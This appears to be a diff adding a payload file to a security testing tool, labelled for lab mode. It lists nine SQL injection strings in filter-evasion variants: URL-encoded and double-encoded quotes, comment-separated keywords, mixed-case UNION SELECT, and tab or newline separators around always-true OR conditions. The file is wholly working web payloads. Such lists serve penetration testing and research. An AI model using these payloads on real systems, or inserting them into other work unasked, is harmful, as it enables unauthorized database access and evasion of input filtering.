@@ -1,0 +1,9 @@
+# Lab-oriented encoding variants (use with --lab-mode + explicit payload file)
+%27%20OR%20%271%27%3D%271
+%2527%2520OR%2520%25271%2527%253D%25271
+1%27)/**/OR/**/(1=(1)--+-
+'-0000union 000SelEcT 01337--
+1' OR 'a' LIKE 'a'--
+1'%0aAND%0a'1'%0a=%0a'1--
+1'%09OR%091=--+-
+1'%0d%0aOR%0d%0a1=1--+-
